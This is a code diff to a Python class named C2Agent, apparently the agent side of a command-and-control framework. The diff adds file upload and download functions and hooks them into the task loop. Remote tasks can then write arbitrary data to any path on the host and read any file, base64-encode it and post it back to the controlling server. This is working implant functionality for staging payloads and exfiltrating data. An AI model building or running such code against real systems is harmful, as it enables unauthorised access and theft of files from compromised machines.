@@ -207,6 +207,89 @@ class C2Agent:
             print(f"[-] Post results error: {e}")
             return False
 
+    async def upload_file(self, remote_path: str, file_data_b64: str) -> Dict[str, Any]:
+        """
+        Write uploaded file to disk.
+        
+        Args:
+            remote_path: Path where to write file
+            file_data_b64: Base64 encoded file data
+            
+        Returns:
+            Upload result
+        """
+        try:
+            import base64
+            from pathlib import Path
+            
+            # Decode base64 data
+            file_data = base64.b64decode(file_data_b64)
+            
+            # Create directory if needed
+            Path(remote_path).parent.mkdir(parents=True, exist_ok=True)
+            
+            # Write file
+            with open(remote_path, "wb") as f:
+                f.write(file_data)
+            
+            return {
+                "status": "success",
+                "path": remote_path,
+                "size": len(file_data),
+                "timestamp": datetime.now().isoformat()
+            }
+            
+        except Exception as e:
+            return {
+                "status": "error",
+                "error": str(e),
+                "timestamp": datetime.now().isoformat()
+            }
+
+    async def download_file(self, local_path: str) -> Dict[str, Any]:
+        """
+        Read file from disk and encode for download.
+        
+        Args:
+            local_path: Path to file to download
+            
+        Returns:
+            Download result with base64 encoded data
+        """
+        try:
+            import base64
+            from pathlib import Path
+            
+            file_path = Path(local_path)
+            
+            if not file_path.exists():
+                return {
+                    "status": "error",
+                    "error": "File not found",
+                    "timestamp": datetime.now().isoformat()
+                }
+            
+            # Read and encode file
+            with open(file_path, "rb") as f:
+                file_data = f.read()
+            
+            encoded_data = base64.b64encode(file_data).decode()
+            
+            return {
+                "status": "success",
+                "data": encoded_data,
+                "filename": file_path.name,
+                "size": len(file_data),
+                "timestamp": datetime.now().isoformat()
+            }
+            
+        except Exception as e:
+            return {
+                "status": "error",
+                "error": str(e),
+                "timestamp": datetime.now().isoformat()
+            }
+
     async def process_task(self, task: Dict[str, Any]) -> None:
         """
         Process a single task.
@@ -228,12 +311,25 @@ class C2Agent:
                 print(f"[+] Task {task_id} completed")
         
         elif task_type == "upload":
-            # Handle file upload
-            print(f"[!] Upload not yet implemented")
+            remote_path = task.get("remote_path")
+            file_data = task.get("data")
+            if remote_path and file_data:
+                print(f"[*] Uploading file to: {remote_path}")
+                results = await self.upload_file(remote_path, file_data)
+                await self.post_results(task_id, results)
+                print(f"[+] Upload completed: {remote_path}")
+            else:
+                print(f"[!] Invalid upload task data")
         
         elif task_type == "download":
-            # Handle file download
-            print(f"[!] Download not yet implemented")
+            local_path = task.get("path")
+            if local_path:
+                print(f"[*] Downloading file from: {local_path}")
+                results = await self.download_file(local_path)
+                await self.post_results(task_id, results)
+                print(f"[+] Download completed: {local_path}")
+            else:
+                print(f"[!] Invalid download task data")
         
         else:
             print(f"[!] Unknown task type: {task_type}")
